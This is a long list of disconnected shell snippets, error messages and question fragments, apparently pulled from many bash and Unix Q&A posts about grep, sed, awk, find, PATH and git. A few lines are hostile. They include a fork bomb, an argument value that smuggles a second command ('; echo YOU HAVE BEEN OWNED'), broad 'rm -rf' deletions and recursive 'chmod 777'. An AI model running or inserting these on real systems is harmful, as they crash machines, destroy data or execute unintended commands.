sudo -E ./masterinstall.sh
sudo -E -u wang ./mygset.sh
sudo -u
uniq -c
$(NF -1)
NF -1
sudo tee -a /etc/profile.d/maven.sh > /dev/null << EOL
grep -E -o ".{0,2}:.{0,6}"
sort -u
awk '/start/,/end/'
Command + ,
$ history > history_for_print.txt
psql produces some log info that is output to terminal, the thing is I can't redirect that info, I want to pass it further as a result.
CREATE TABLE .. AS SELECT...
test -f /path/to/file
[ -f /path/to/file ]
update_history(<cmd issued>)
move_history(cmd issued)
"Nov 30"
"Nov   30"
grep 'Dec * 1' file
grep "$(date +%b) * $(date +%d)" file
f http://example.com/resource
f http://example.com/resource p1=v1 p2=v2
${PARAMS:+"--data" "$PARAMS"}
"--data" "$PARAMS"
r = sqrt(x^2 + y^2 + z^2)
f = r^4
f = (r^2)^2
sum=$(ls -l *.data | wc -l)
stddev = sqrt(fluc - (r^2)^2)
rm a.txt b.txt c.txt
touch -d
touch -d
systemctl hibernate
hibernate-timer 50
sleep: invalid time interval ‘m’
bash -c
-- $1
bash -c
sleep 50m
sleep m
-- $1
bash -c '...'
associative arrays
troublesome line is the following
sudo visudo
Stephen-Troschs-MacBook-Pro:blog stephentrosch$ config/routes.rb
-bash: app/views/home/index.html.erb: Permission denied'
vi config/routes.rb
find src/js -name '*.js'| ruby -ne 'BEGIN{f=[];}; f<<$_; END{f.sort!{|a,b| a.count("/") <=> b.count("/")}; f.each{|e| puts e}}' | xargs cat >> concatenated
find ...  -printf "%d\t%p\n"
sort -n
info sed tac
su - jenkins
env -i K1=V1 K2=V2 ... your-command
echo foo > /dev/tty
R 3.0.2
man wget
python programname.py
man cat
/usr/bin/perl <original_script>
export HUBOT_LOG_LEVEL="debug"
export PATH=$PATH:/path/to/start-stop-daemon/directory
source ~/.bash_profile
source ~/.bashrc
echo $LANG
if the file has words and numbers in it. How do I make it read just the numbers from the file?
Syntax error: Bad substitution
FILEBACKUPLOCATION= /../.../FMonday
brew install rename
shopt -s globstar
"name": "value"
not recommended
for (i=1; i<=NF;i++) $i=h[$i];
double end-of-line
some text qwe
qweqwe qweqw
some text qwe
qweqwe qweqw;
sudo chown -R $USER /usr/local
cat foo.txt | sed s:ZSH_THEME="(.+)":bar:
while loop
{} +
{} \;
script user_screen.log
$(( $do_smth ))
typeset -f
./adb kill-server
span id
lsof -p yourpid
exec 5>&-
pstree -p
nohup urxvt -e ssh somehost &
urxvt -e ssh somehost & disown $!
Ubuntu 13.10
sed 4.2
bash 4.2
python script.py
$(dd ...)
declare TEST$i=...
RESULT=$((TEST[1] + TEST[2]))
$(( ))
$( )
INT UNSIGNED
INT UNSIGNED
read $dirName
grep "\\" XXFile
grep '\\' XXFile
IFS=$'\n' read artist album title
echo "${#foo[@]}"
yad --notification
apt install yad
echo $var2
return $var2
if [[ ${arr1[i]} > 100 ]]
if [[ ${arr1[$i]} > 100 ]]; then
if [[ ${arr1[$i]} > 100 ]];
if [[ ${arr1[$i]} -gt 100 ]]; then
if (( ${arr1[$i]} > 100 )); then
if [ $res ] ; then
crontab -l
a b "x y"
"x y"
./x $1
"x y"
'a b "x y"'
script y
script x
'separate arguments in one '
find /var/sadm/spool -size 512c
find /var/sadm/spool -size 0c
-z, double [[ ]
man useradd
something | myscript
myscript < infile
test -t
test -e
tty -s
read -t 0 ...
dd iflag=nonblock
response=$(curl -i --user api:$APIKey --data-binary @$target https://api.tinypng.com/shrink)
message=$(parseJson "$response" message)
No JSON object could be decoded
No JSON Object could be decoded
the response is on multiple lines
man grep
Example example1
fold utility
grep -o
echo "Example example1" | sed 's/\(.\)/\1\n/g'
echo "Example example1" | while read -r -n 1 c ; do echo "$c"; done
watch -n1 "bash test-script"
watch -n1 ./test-script
{ ...; }
tail -f
ssh .... | grep ...
udevadmin monitor -e
man systemd.device
-newer $directory2
cd .
cat /dev/urandom
cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1
openssl rand -base64 36 | tr -dc 'a-zA-Z0-9'
ls ... | awk
$(ls -1t | tail -n +31)
if [[ $(find "$f" -mtime +30 -print) ]]
LC_ALL=C cat input.vcf | fgrep -w -m 1 $POS | awk '{ FS=OFS="\t"; print $4 }'
LC_ALL=C, -m 1, fgrep
cat and grep
tail -f
; exit
print $4
"sudo nano /etc/sysconfig/vncservers"
[VNCSERVERS="1:root"  VNCSERVERARGS[1]="-geometry 1324x700"]
nano .vnc/xstartup
pip freeze
django-admin.py startproject test_project
-bash: django-admin.py: command not found
echo $PATH
man date
date|awk '{print $4}'
man bash
kill -SIGSTOP
kill -STOP
dirname $0
wget -O ~/scripts/rake https://raw.githubusercontent.com/ai/rake-completion/master/rake
. ~/scripts/rake
gnu awk
\/' treated as plain
-d $'\0'
help mapfile
cmd1 && cmd2
man bash
2> /dev/null
man mount
eval exec $i\>\$i
exec 2>$i
read <var>
echo -n
head -1
grep $srv /etc/hosts | head -1 | awk -F" " '{print $2}'
cat: 1: inexisting file or directory
GNU sed
. filename
. script.bash
source script.bash
case ... esac
(( ... ))
system("perl sample.pl 1 &");
`perl sample.pl 1 &`
cat file.txt | perl ...
'{print $5}'
find -printf
stat --printf
source /opt/rh/devtoolset-1.1/enable
Mon Jan 1 01:01:01 2013 +0500
command not found
brew install wget
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
==> Next steps:
ls -ct
tail -n +2
xargs rm
[  OK  ]
-I __declspec
lsscsi | tr -s ' ' | cut -d' ' -f7
XU MACADDRESS1
$(printf '%04s' "${cur_number}")
No function matches the given name and argument types
:h event
clock_edit /node/proj/config.txt
for fname in nmm-*.txt
/bin/ls nmm-*.txt | …
alias ls=…
bash -x my_script
set -x
tr -d '\001'
CALL testSummary()
[ ${dayofweek} ='Wed' ]
[ ${dayofweek} = 'Wed' ]
select 1 + 1
-e "CALL testSummary();"
$ ./test.sh
/bin/bash test.sh
man sed
rep extension /usr/local/lib/php.ini
grep extension /usr/local/lib/php.ini
ls | grep soap
echo "extension=soap.so" >> /etc/php/7.0/cli/conf.d/40-soap.ini
sed "s|pattern|replacement|g"
cmd | while
man bash
vagrant ssh
done < $file_name
\n run 120
echo "${IP}"
sudo docker inspect $i | grep IPAddress | cut -d '"' -f 4
xdg-open 'http://$IP:7111/execute'
IP=sudo docker inspect $i | grep IPAddress | cut -d '"' -f 4
xdg-open 'http://$IP:7111/execute'
compgen -A alias
awk -F '[[:blank:]]+' '{printf ("%s ", $2)}' list
awk -F '[[:blank:]]{1,}' '{printf ("%s ", $2)}' list
git bisect
for f in
; do ffmpeg -i "$f"; done
ffprobe -i
ffmpeg -i
At least one output file must be specified
for f; do ffprobe -i "$f"; done
Dec 23 22:15:14 ubunix kernel: [ 2320.727997] 8139too 0000:01:04.0: eth0: link down
date +%b
man date
Dec  5
grep -c
$1 == "Application"
if (l) print l;
variable l
$1 != "Application"
{l=l $0; next}
variable l
END {print l}
man 7 pipe
curl http://mysite/num.txt
Records returned: [3]
The total records returned =
#! /bin/bash
Window->Preferences->Shell Script -> Interpreters
echo $PATH
Hello World
Jan 2014
Jan 2014
python -c "import sys; print sys.argv[1]" "test\ntest"
-print0 | xargs -0
Also are there any alternate commands that provides same functionality in Unix
-exec utility [argument ...] ;
-type f
sed -i
sed command
man curl
cat FileA | tee -a FileB
sudo mkdir ftdetect
unit-test-command with args
svn up
somecommand | colorize -c _green_ 'foo.*bar' 'other'
grep --color
some_command | colorit
-S sh
man lolcat
sort -k +2 out.*
man bash
gnu awk
'<,'>!column -t
'<,'>!sort -n -k2
'<,'>!sort -n -k15
:h :sort
:h range
'<,'>!sort -t' ' -k2
man sort
| tee -a outputfile.txt
(command1; command2; command3) | tee outputfile.txt
2>&1 >> $_logfile
exec 3>&1;
echoecho() { echo "$*"; echo "$*" >&3; }
echoecho Whatever
exec 3>&-
exec ls -l
echo … >&3
dirname $0
pwd -PL | sed sg.\*/ggg
rvm reload
OSX 10.9.1
source /etc/aliases.local
sed -r -f script.sed file
for {1..8}
|| continue
MSG to SEND
cat <&3
$(cat <&3)
while read
cut -f2 file
cut -f2 file
cut -f2 file
screen -rd
which python
which python
grep -c -P '$' a.txt
grep -c -P '\n' a.txt
man grep
wc -l
grep -c
wc -l
grep ''
No results found. Do you want to retry with different pattern (y/n)?
until [ -n "$(grep $pattern)" ]
ls -l | less
ls | less
-r or --raw-control-chars
<option value="1" selected="selected">1</option>
<option value="1" selected="selected">1</option>
festival --server
HEAD /
export PATH=$PATH:/usr/local/sbin/:~/android-sdk-linux/platform-tools/
sudo adb shell
./adb ...
which R
which R
which Rscript
tr '\0\n' '\n\0'
tail -n 2
tr '\0\n' '\n\0'
cp ... "dest"
-I "{}" ... "{}"
$ find . -iname "*FooBar*"|tail -n2|xargs -i cp "{}" dest
find ... -print0
sed -f -
echo "PATH=$PATH/Downloads" >> .bashrc
git --version
"ex file"
"ex core-file"
{\ A," B",' C'}
grep -E
grep -E
read -a values
wc -l
cat <(awk -F: '{print $1}' /etc/passwd)
cat < (awk -F: '{print $1}' /etc/passwd)
paste - - - - - -
for i in 1 2 3 4 5
for(( i = 0; i<=5; i++))
Syntax error: Bad for loop variable
arithmetic BASH loop syntax
older bourne shell
set -xv
set +xv
export PS4=\$LINENO+
set +xv
which python
which ipython
conda update
which ipython
echo $PATH
echo $PATH
ls -l|awk '{print $9}'|grep -o ^[0-9]*
ls -l|awk '{print $9}'|grep -o [0-9]*
ls -l|awk '{print $9}'|grep -o ^[0-9]*
ls -l|awk '{print $9}'|grep -o [0-9]*
find /path -name 'pattern'
[ |$]
(p){ print }
'chomp; print "'$_'\n"'
chomp; print "
grep -P
expr: syntax error
bash: command not found
update-rc.d -f gdm3 defaults
/usr/sbin/update-rc.d -f gdm3 defaults
./script.sh arg1 [options]
./sample.bash -a one -p two more -d sample
./sample.bash more -a one -p two -d sample
bash --version
uname -a
grep -v "No Problems Found"
grep -B 1 -A 1 -v "No Problems Found"
| awk '{print $0 " cluster=y"}'
done | nc $TSD_HOST $TSD_PORT
tcollector | awk '{print $0 " cluster=y"}
.bashrc nor .bash_profile
function() debianDeps{........}
function debianDeps (){........}
vi loc_change
chmod 777 loc_change
source ./loc_change
grep -f
grep -v
id= cut -c-5 $line
cut -c-5 sample.txt
head -c5
man bash
[ ... ]
[ ... ]
[[ ... ]]
mate .
-bash: mate: command not found
TextMate version 2.0-alpha.9501
OS X 10.9
which mate
open /Applications/TextMate.app/ .
git add --interactive
git add -i
git add -i
git add -i; q
git add -i
; q
set -o pipefail
-type f
, so I used that. Since
is included, I didn't have to add
-print0  | xags -0
-exec ls
slots (content: 5)
npcs (content: 1)
Execution has sterted
rm /home/abc/output/*~
grep brown
expr -2^63 | bc
0 && 1
awk '{ print $4}'
read $ans1_4
read ans1_4
make all
This is default target
make Program
export PYTHONPATH=$(python -c 'import sys;print ":".join(sys.path)')
tail +3 a.txt
$(( ))
chmod +x /etc/init.d/scriptname_what_ever_feed_i_name
chmod -R 777 /etc/init.d/scriptname_what_ever_feed_i_name
/etc/init.d/scriptname_what_ever_feed_i_name restart
* * * * * /etc/init.d/scriptname_what_ever_feed_i_name restart
file not owned by any package
sort -nu [filename]
sort -un
man sort
sort -u
echo aaa.bbb.ccc=3 | grep  "aaa\.[^.]\+\.ccc=3$"
echo aaa.bbb.ccc=3 | grep  "aaa\.[^.]\+\.ccc=3[^0-9]*"
du -Sh
wc -c
ls -l
rake tmp:clear assets:clean log:clear RAILS_ENV=production
rake: command not found
echo $PATH
man top
tail -n 500 -f
tail -f
ls /etc/*
(echo out; echo err >&2) 2>/dev/null |& cat
kill $!
kill $PID
kill $process_id
mkdir -p {dira, dirb}/sub
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu)
directory/user1 directory/user2
find directory -type f
if ... fi
[[ -d "${entry}" ]] && find ...
-m 1
echo <(sudo openvpn --config FILE)
exec 3< /dev/fd63
sed '/Initialization Sequence Completed$/q' <&3
cat <&3 &
[[ ]]
set -o pipefail
bash -c '<command>'
time ls
exec 2>&1
'time ls'
time ls
"time ls"
>> /var/log/backups
-c %s
[ 0 -gt 100 ]
$(grep ...)
1 -> 4
NF-3 -> NF
echo $TERM
vim ~/.tmux.conf
set -g default-terminal screen-256color
Do the backticks spawn a subshell and thus making my script not work?
How do I work around this issue?
while read line; do #while loop
[named -V|grep BIND|awk '{printf ($2);}']
VER=$(eval "$2")
" "
find -exec
head -n -1
BULK INSERT
LOAD DATA INFILE
man bash
cd | cbpaste
cd | cbpaste
sed 's/[# \t,]/REPLACEMENT/g' input.txt
' '
sed 's/[# \t,]/replacement/g' input.txt | tr '\n' 'REPLACEMENT'
get command not found
environment variables
mvn 2.X versions
mvn 3.1 versions
xargs grep
head -1
sed -e 1s@^@/p/a/t/h/@ -e 1q
foo $(expr 1 + 1)
expr 1 + 1
foo expr 1 + 1
second last line
second last
now { ... }
now { ... }
now { ... }
tar-czvf $(date +%m_%d_%Y)
Baseline Standard deviation
kill -HUP pid-of-init
man inittab
$0=$NF FS$0
Desti = Motion
Desti = Motion
Desti = Motion
/^<mm>/ && !/LongTime/ {f=0}
pidstat -r -p <pid> <interval> >> log_Path/MemStat.CSV &
var=$(cat ${DIR}/test.txt)
|sed -n ${n}p
seq 20
read -a
folders=("2014-09-01-00:00:01" "2014-09-01-01:00:01"...)
| head -1
ssh user@host
su user1 ...
ORA-01403: no data found
bzr pull
bzr pull
bzr status -r branch:PATH_TO_REMOTE_BRANCH
bzr missing
git filter-branch
command not found
export PATH=$M2
current bash and its child process
.bashrc and .bash_profile
env | grep M2_HOME
env | grep JAVA_HOME
ls /usr/local/apache-maven/apache-maven-3.1.1/bin
source ~/.bash_profile
env | grep M2_HOME
export PATH=$M2:$PATH
echo $PATH
echo $PATH 
screen -ls
sudo screen -ls
sudo screen -r
| awk '{print $3}'
s/^[^\t]*\t[^\t]*= *//p
cut -f2 | awk '{ print $3 }'
-F '\t'
-M y
-M n
.encode(sys.stdout.encoding, errors="some string")
[[ ... ]]
ping -c
${array[0]}${array[*]/#/$(echo \|)}
City 1|City 1 |City 3
$(info my comment goes here)
rem "string"
$(call rem, my comment goes here)
rem my comment goes here
$(info ...)
$(rem ...)
rem = $(if,$(1))
$(: my comment goes here)
for loop
<(process substition)
bash script.sh
sh script.sh
sed -e '/my_stat/s/x/\./g' file
xargs -n4 < file
cut -d' ' -f1-3
whiptail --infobox
smcup=\E[?1049h, rmcup=\E[?1049l,
2014-01-07 03:43:35,223 INFO ...some data
date +"%F %R"
grep '^'"$(date +"%F %R")" agent.log
date --date="@$(($(date +"%s") - 2*60))" +"%F %R"
$0 ~ start, $0 ~ end
: again
t again
command not found
$(ls -a .*profile)
ls -v
ls -v
somecmd "some<C-V>
echo -e
easy_install pip
sudo easy_install pip
ls -l
brew install python
which pip
brew install virtualenv
brew install virtualenvwrapper
pip install
export PIP_REQUIRE_VIRTUALENV=true
ref=\"#[[:alnum:] ]*\"
sed -r s/ref=\"#([[:alnum:] ]*\)/(\1s/ /-/g)/g'
echo "Match\!"
set +H
set -H
B.php error=2
Mac OS
Bash terminal
/bin, /usr/bin and /usr/local/bin
awk with print
bash scripting
$(echo Hello)
awk '{echo $1}' test.txt
Shell Scripting Recipes: A Problem-Solution Approach
$(echo hello)
echo hello
grep "/nwsys/release/conf/"
>> nonexistent/file.log
mkdir -p
echo 'ls -1' | sftp <hostname> > files.txt
varname=$(echo 'ls -1' | sftp <hostname>)
log_file -noappend ls.out
sed -n '$d;2,$p' log.out
cp /dev/stdin file.xml
grep -o
lookedup_host_names+=( ... )
pigz -d
echo "hello" >&1
echo "hello" 1>&1
echo "hello" 2>&1
echo "hello" 2>&1 | tee log
set -e
cmd || true
read $a
read a
read choice
a=""; b=""; c="";
echo "password" | ssh user@remote.host
user@remote.host's password:
ssh-copy-id user@machine
grep -l
man printf
feff 0068 0065 006c 006c 006f
ff fe 68 65 6c 6c 6f 00 53 53 48 5f
ff fe
echo -n hello | iconv -f ascii -t utf-16 | hexdump -C
./test $(echo -n hello | iconv -f ascii -t utf-16)
$numbers | grep -c ①
sudo apt-get install compiz-plugins
xdotool key Super+n
sed -i -e 1,'count'd filename
Number of files transferred
Total transferred file size
checkout -- <file_name>
mrt bundle bundle.tar.gz
meteor_bundle.sh: line 9: bash: command not found
launchctl submit -l somename -p /path/to/script -o output.txt -e errors.txt
launchctl submit
-p pid
kill -0 $PID
pid=$(cut -d' ' -f4 < /proc/self/stat)
crontab -e
echo -e
C:/Program Files (x86)/Git
adb pull "/sdcard/DCIM/Camera" "E:\Phone Pics\HTC DNA"
--data <data>
rm -rf `-`
getent passwd
getent passwd ${SUDO_USER:-$USER}
(720/304) * 360
int(720/304) = 2, 2 * 360 = 720
bc -l
ls -R
read text
bc -l
/dev/avro-mapred-1.7.4.jar: Permission Denied
Permission denied
./script.sh a b c
"$*" All the positional parameters (as a single word) *
"$@" All the positional parameters (as separate strings)
ARG[1] == "par1" ARG[2] == "par2" ARG[3] == "par3"
ARG[1] == "par1 par2 par3"
/tmp/testargs.sh a b c 'd e'
for i in $(seq 1 $#)
$url1 $url2
$url1 & $url2
man bash
su -c
su - user1 --session-command "/user1path/user-script.sh"
su - user1 -s /user1path/user-script.sh
[ ${file/2pcs/x} != $file ]
but of course I can't use this with grep.
for loop
grep -i 'i$'
<some text> from=someuser@somedomain.com, <some text>
grep -Eo
grep -oP
argument list too long
./some_program.sh: line 8: ./some_program.sh: line 7: type: someprogram: not found: No such file or directory
ls -1 or find...
aaaaaaaa… -this is a very long line - …aaaaaabcbcbcbc
aaaa… …abcbbc
chmod 644
set -x
read <pipe
GNU bash, version 4.2.45(1)-release (x86_64-pc-linux-gnu)
foo.py and bar.py
foo.py creates a file foo_cur_timestamp.txt
bar.py creates a file bar_cur_timestamp.txt
%python foo.py or bar.py
foo_ .....txt and bar_....txt
echo ${line} | cut -d' ' -f5 | sed s/:[^:]*$//
read line
cut -d' ' <<< "$line" | sed ...
ipaddresses=$(netstat -ano | awk '...')
uniq -c
sort -r
sort -rn
uniq -c
<tag ... >
df -h
condor_qsub '-n' unrecognized option
foo bar
parallel echo {} ::: A B C
wc -w
man wc
mkdir "foo bar" "ick poo"
foo bar
echo -e
echo $PATH
No such file or directory
seq -f
$A='foo bar'
$B='omg bbq'
$C='stack overflow'
ts -s
ts -i
echo -n
if [ $numberOfBackups > $maxBackups ]
= $HASH
./script.sh /backups/daily
ls -lh
ls -lh /backups/daily
crontab -e
man crontab
curl -s http://example.com/api_call/DOTTY
-55.5833 50.6333
egrep -o
-bash: mongod: command not found
type -a
grep -q
x[y]=([z]=w) ls > log
if date -d "2012010123"
man bash
find .
-name '*.*'
-exec cp -t /your/destination/dir/ {} +
{} +
cp -t
sh SCRIPT.sh copy-from-directory .extension copy-to-directory
-l 1000
find . -name "*" -type f | xargs grep -l "xyz" | sed -i '' 's/'${line}'/'${rep}'/g'
sed: -i may not be used with stdin
find command
-name "*"
echo !(file1|file2)
rm -rf !(file1|file2)
shopt -s extglob
sed -n '/void/,/(/p' test.c
cut -f -d
mysql --batch
echo $row[0]
./benchmarker.sh core_url sync_url -d 500 -c 100 -n 200
core_url sync_url 500 500 500
local OPTIND
man bash
directory A
directory A
directory B
find *
man bash
stdbuf -o 100 awk ...
git pull
git pull; tput bel
tput bel
tput bell
ps -ef
set +x
[[ ]]
grep -E
[[ ... =~ ... ]]
Regex Test
find /nfs/machine -maxdepth 0 -empty
ls /nfs/machine
while true
supvervisorctl tmuxservice restart
man mysqldump
[14/Jan/2014:02:36:50 +0100]
awk '{x[NR]=$14; s+=$14}   END{a=s/NR; for (i in x){ss += (x[i]-a)^2} sd = sqrt(ss/NR); print "SD = "sd}'
if $REG -a $VIN
if true
if $REG && $VIN
if [ "$REG" -a "$VIN" ]
if test "true" -a "false"
if [[ "$REG" && "$VIN" ]]
BEGIN { ... }
FNR==i { ... }
{ ... }
cat lista.local
sed 's/^/Successfully downloaded /' lista.local
virsh dominfo kvm110
State:          running
virsh dominfo kvm110
declare -A
declare -A
declare -a
bash --version
grep -i 'over' lines.txt | grep -v 'stackover"
chmod +x studio.sh
sh ./studio.sh
sh -x ./studio.sh
ls -d
xargs ls -d 2>/dev/null
xargs ls -d
ls -d
-d '\n'
set -xv
set -xv
set +xv
export PS4="\$LINENO> "
set -xv
{ ... }
cd /;/bin/bash
cd /;
bash -c 'cd /'
date -d
date +"%Y-%m-%d %T %z"
date -Iseconds
quote "A string's but a string."
quote "A newline *doesn't*
seem to break anything..."
man bash
sublimetext <(cat)
EDITOR='subl --wait'
sublime -w
echo "hello" | tosubl > local.file
F=$(mktemp); cat > $F; subl $F; subl --command ansi; sleep .5; rm -f $F
sudo apt install tcc
chmod 755 /usr/local/bin/subl_pipe
subl -
wc -l
grep a.txt -q -f b.txt
sh SCRIPT.sh a.txt b.txt
ps -ef
shopt -s extdebug
wc -l
wc -l
{print $col}
row=2 col=2
echo {} | sed 's/.*\///'
$CMD $@
alias meld="meld $@ &"
ps wafux
$(__git_ps1 " (%s)")
source path/to/git-prompt.sh
export PS1
500 server error
--post-data= "/"$STR/""
" 12 "
echo "this and that 12 those" | ggrep -o -P '(?<=this\sand\sthat)[\s\d]+'
-E -P -o
-maxdepth 1
-printf '.'
wc -m
wc -m
ls -1 ...
find ...
ls -1f
shopt -s nullglob
-maxdepth 1
[[ ]]
[[ ... ]]
mysql -u...
$( ... )
PATH=$(dirname $FILE)
echo $LINE
echo "$LINE"
9< "$1"
git branch -D branchname
git branch -l
xargs git branch -D
[[ ]]
expr length
readlink /proc/self/fd/1
$(ls -1)
echo "$file" | do_something
man find
cat file
tee > file
echo -- "-e"
-- -e
env echo ...
-n -e
-n -e
-e 2 -e
[first letter]
grep -o
Error Description 1
Error Description
ssh: Could not resolve hostname XXX.XXX.XXX.XXX: Name or service not known
which expect
mv bash.sh sftp.exp
bash bash.sh
sh bash.sh
chmod a+x sftp.exp
send "myPassword"
send "myPassword\r"
exp_internal 1
grep name
echo "$zz"
echo $zz
function deref { echo "${!1}" ; }
deref() { echo "${!1}" ; }
alias ls='ls --color=always'
for f in *.txt.gz
zgrep MYBOND $f
zcat $f | grep MYBOND
[ var != value ] or [ var != value1 ] or [ var != value1 ]
ls *.pdf
123 45 6789
grep -v
mesg -n
tty -s && mesg -n
LINKS=$(cat myfile.txt | grep MYWORD)
/00$/ {print a; a=0}
END{print a}
wc -l
line 15: =building: command not found
from here
to here
sudo ./start-hbase.sh
sudo chmod +x start-hbase.sh
echo "${@}"
while getopts
echo "${@}"
exit 1
return 1
Installer Package (.pkg)
{printf "chr:%s-%s\n",$2,$2}
which sl
file $(which sl)
gnome-terminal -e "..."
rsync --option1 --option2 "long path"
'--option1 --option2 \"long path\"; echo YOU HAVE BEEN OWNED'
gnome-terminal -t 'Rsync scheduled backup' -e "nice -10 /Scripts/BackupScript/Backup.sh 0 0 '/Scripts/BackupScript/Stamp' '/Scripts/BackupScript/test' '--dry-run -g -o -p -t -R -u --inplace --delete -r -l ''/media/MyAndroid/Internal\ storage''' "
while read file ...
-a 1
-o 1.1,2.1
git fetch
git fetch
git fetch
git fetch
screen -c .splitscreenrc
print $0
echo "\n exit" > file1.sql
echo $'\n'" exit"
echo -e
echo -e
grep -E
[[ ... =~ ... ]]
chmod +x
-i infile
find ./polkadots -name 'image.pdf' -exec convert -transparent white -fuzz 10% {} image.png \; -print
| while read -r -d '' f
("/usr/bin/find" "/usr/bin/xargs" "/usr/bin/wc")
"whereis where"
("/usr/bin/where", "where")
echo -e $(./script "whatever")
"FAILURE for $machine",
"FAILURE for ${machine}",
uniq -d
|| [ -n "$REPLY" ]
ls -1
echo -e
recover -s ttlhydnwr -c tphtpsd2
rm -r secrets/!(snapsearch)
chmod +x awko
awko data.pot
" -
cat ../stdout_info/HTSeqQAllBAMsamples.o277329 | grep -n Sample_10Y_W34
sub(/.head$/, "")
sub( docpath, installpath )
sub( installpath, pkgbackpath )
-h  CC:AF:78:B3:E5:0F
ANSI-C Quoting
:(){ :|:& };:
name 'weectrl_manage_view' is not defined
$ ./tablooku.sh 3 2 tablom.dat
$ ./tablooku.sh -r 3 -c 2 tablom.dat
unary operator expected
-f was triggered, Parameter:...
$ ./tablooku.sh -r 3 -c 2 -f tablom.dat
<deleted, I misunderstood the question>
find /foo/bar*
find /foo -name "bar*"
find /foo/bar*
Project 1
Project 2
git init
git add
git status
git add -A
set -xv
set -xv
set +xv
export PS4="\$LINENO> "
set -xv
set -xv
set -v
set -x
PS="\$LINENO: "
set +xv
set -x
find -exec sed
chmod $_owner $_con"Controller.php"
stat -c %U /path/to/file
echo 'test text "here_is_some_test_text_'$counter'" "output"' >> ${FILE}
removeListener(event, listener)
git commit
git status
source ~/.bashrc
cat -n
:loop;$!{N;b loop}
s/\([^\.]\)\(\n[ \t]*\n\)/\1.\2/g
ls -L |
for loop
cd ..
cdd dir3
cdd 2
cdd 2
cd -
set +e
p4 sync
/path/to/my/neat/program > logs/program.log 2> logs/program.err
sed 's/\n//' /path/to/file
pmset -g echo -g assertions
(pmset -g; echo; pmset -g assertions)
{ pmset -g; echo; pmset -g assertions; }
-exec mv {} +
-type f
-type d
$(date -Ins)
tail -f infile | grep -a --line-buffered "." | sed 's/^/'"$(date -Ins)\t"'/'
$(date --rfc-3339=ns)
tail -f infile | grep -a --line-buffered "." | sed 's/^/'"$(date --rfc-3339=ns)\t"'/'
ps aux|grep httpd|grep -v grep
ps aux
1 2 3 5
vim -c
-S script.vim
[allIndex] = [@]
-type f
-type d
-type f
-type f
sh $0
date -d
+ 410
mydata=$(myprogram etc)
echo $mydata
another_command foo1 bar1
foo1 bar1 foo2 bar2 ... foo_n bar_n
echo "abc" | ./program
echo "def" | ./program
tr -s ' '
echo "abc" | ./program
echo "def" | ./program
echo "abc" | sh program
echo "def" | sh program
"I am a file.txt"
php -v
-bash: php: command not found
Syntax error: "(" unexpected
dash foo.bash
sh foo.bash
removespaces.sh file with spaces.doc
man 3 printf
printf "%-10s" foo bar
printf "%-10s" foo; printf "%-10s" bar
VAL1 VAL2 VAL3 VAL4
echo $OUTPUT | sed 's/\ \ /\,/g')
echo $variable
echo $OUTPUT | sed 's/\ \ /\,/g'
-n 1
read -n
read -n1 $user_decision
read -k1 user_decision
sed '/some_part_in_A/rB.txt' A.txt > C.txt
sed "/line_one/N;/line_one\n.line_two/rB.txt" A.txt > C.txt
/etc/passwd bgates:x:23246:879:Bill Gates:/co/bgates:/bin/bash
pkill rails
grep -ie rails
grep -ie [r]ails
pkill -9f rails
MAX_ARCHIVE_AGE = 50
read -p
read -p
read -d $'\r'
setsid sleep 100
man bash
setsid --fork
. tutorial/bashrc
. ~/.bashrc
. tutorial/bashrc
sed -i
echo ${outputArr[*]}
for (i=2;i<NF; i++) $i=$(i+1)
{print $0}
egrep -v "er$|est$" test.txt >> results.txt
grep -E
./filter.sh input > output
echo "$line" | tr ',' ' '
tr ' ' '\n'
man wait
grep -v
declare -F function
declare -F
declare -F my_function && echo 'function exists'
man bash
git ls-tree origin/master:<remote_dir>/<remote_subdir>
mail -S5 controntab
man crontab
lastlog -u 'user'
cut -d' ' -f4
ls -l
ls -l
ls -l | awk '{split($0,array," ")} {print array[9]}'
ls -l | awk '{print $9}'
reserved word
buffer1.txt in branch X in repo gitRepoA
branch Y
buffer2.txt in branch Y in repo gitRepoB
buffer2.txt in branch X in repo gitRepoA
git status
<filename> on <branch> in <repo> current state is <state>
Win32 .EXEs
find / -name '* *' -exec mv {} $(echo {} | sed 's/ /-g')\;
$(echo $filename)
mv "$file" ${onespace// /-}
find . -type f -print0 | while read -r -d '' file
quit :OUTRES
ps -axo start,pid,command | awk '$NF == "loop.sh" {print $1 " " $2}'
kill -9
find . -name \*.m | xargs genstrings -o en.lproj -o base.lproj
n or N
1 row affected..
1 row affected..
UPDATE kplustp..Service SET Service_Name = "PositionService", ServiceType = \'Z\', Hostname = " "
1 row affected..
Job completed successfully
Job completed successfully
1 row affected
Job completed successfully
grep -m NUM
grep -m NUM
ps -aux
python --version
date -d "inputDate -X days"
ssh -l user host
grep -c
xargs echo
ls /tmp/foo*
$ ./adder 1 2
1 2
$ ./parser | ./ adder
<a href="*http://www.google.com*"></a>
cut -d’”’ --output-delimiter=$'\n' grepedText.txt > links.txt
cat drawspace.txt | grep '<a href=".*">'
grep '<a href=".*">' drawspace.txt
capturing groups
dbus-monitor "some arguments" | egrep --line-buffered "Timestamp:*" |
while read -r line ; do
echo $selected
20140121|Adrian Perez|
grep <pattern> <file>
cat <file> | grep <pattern>
grep "20140121-21:48:26|Joanne Frances|" foo
sed -e 's/<[^>]*>//g' wget-file.txt
who |grep
[ $(who |grep -c .) -gt 1 ]
return $?
sed -n 's/.5$//gp' data2.txt
sed -f script.sed data2.txt
alias rm='rm -i'
alias commit='git commit -a'
printf %q
grep -n "^L 7p 39 C\|^N 2" airportdata.txt | cut -f1 -d: >> matches_all.txt
N 2
N 2
N 2
N n
N n
N 2
N 9
N 2
N 2
add_1.txt add_2.txt add_3.txt add_4.txt
N 2
python translate.py
if [ [ $i % 3 ] == 0 ] && [ [ $i % 5 == 0 ] ]
[[ ]]
[ ]
[ [ ] ]
[ [
] ]
(( i % 15 == 0 ))
[ ... ]
[ ]
( )
\( ... \)
if [ 3 > 5 ]
[ 3 ]
[ 3 ]
[ ... ]
[[ ... ]]
[ ... ]
$(( ))
[[ ... ]]
[[ 05 = 5 ]]
[[ 10 > 5 ]]
(( ... ))
[[ ]]
[[ ... ]]
$(( ... ))
(( ... ))
$(( ... ))
echo $((3+5))
echo 8
if grep somepattern somefile; then...
if somecommand; then echo "it worked"; else echo "it failed"; fi
[ ...]
